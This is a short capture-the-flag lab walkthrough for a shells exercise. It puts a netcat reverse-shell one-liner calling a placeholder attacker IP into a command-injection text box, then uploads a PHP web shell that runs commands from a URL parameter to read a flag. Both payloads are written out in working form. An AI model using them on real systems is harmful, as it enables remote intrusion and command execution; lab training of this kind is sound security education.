# Activity performed as part of Shells Overview

- **Pre-requisite** :
1. Start bith target machine and the Attack box provided in the room.

- **Practical Task** :
- **1. command injection vuln** :
1. Navigate to the target: <Traget>:8080.
2. Click on the command injection vuln(Reverse/Bind Shell Task).
3. User should be able to view the text box accepting input.
4. Enter the command: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f" in the textbox 
5. On the Attacker machine use command:"nc -lvnp <PORT>". Then click on enter on the input provided for the textbox.

- **2. unrestricted file upload** :
1. Navigate to the target: <Traget>:8080.
2. Click on the command injection vuln(Web Shell Task).
3. Create a shell.php file with th code below.
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
4. Upload the file using the upload functionality.
5. Using the endpoint:"http://<Target>:<PORT>/uploads/shell.php?cmd=cat%20flag.txt". Get the flag.

